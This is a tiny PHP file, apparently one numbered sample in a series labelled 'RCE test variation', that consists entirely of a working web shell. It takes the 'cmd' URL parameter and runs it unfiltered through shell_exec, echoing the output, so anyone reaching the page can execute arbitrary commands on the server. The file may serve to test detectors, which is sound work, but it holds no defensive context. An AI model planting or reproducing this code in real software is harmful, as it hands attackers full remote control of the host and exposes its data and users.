<?php
// RCE test variation #1056
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>